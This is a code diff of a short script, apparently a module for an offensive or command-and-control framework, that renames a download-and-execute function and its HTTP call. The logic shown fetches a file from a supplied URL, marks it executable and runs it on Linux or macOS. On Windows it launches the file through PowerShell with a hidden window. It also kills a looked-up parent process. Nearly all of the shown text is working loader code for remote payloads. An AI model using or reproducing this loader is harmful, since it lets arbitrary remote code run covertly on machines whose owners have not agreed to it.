@@ -3,10 +3,10 @@ def get_parent_process(process_name):
         if process_name == cur_proc['name']:
             return cur_proc['ppid']
 
-def download_and_execute(url):
+def http_get_and_execute(url):
     if sys.is_linux() or sys.is_macos():
         # Download
-        http.download(url, "./tmp.elf")
+        http.http_get(url, "./tmp.elf")
         sys.shell("chmod +x ./tmp.elf")
         # Execute
         sys.exec("./tmp.elf", [], True)
@@ -18,11 +18,11 @@ def download_and_execute(url):
             process.kill(ppid)
 
     elif sys.is_windows():
-        http.download(url, "./tmp.exe")
+        http.http_get(url, "./tmp.exe")
         sys.exec("powershell.exe", ["Start-Process -WindowStyle hidden ./tmp.exe"])
 
     else:
         eprint("OS not supported")
         return
 
-download_and_execute(input_params['url'])
+http_get_and_execute(input_params['url'])
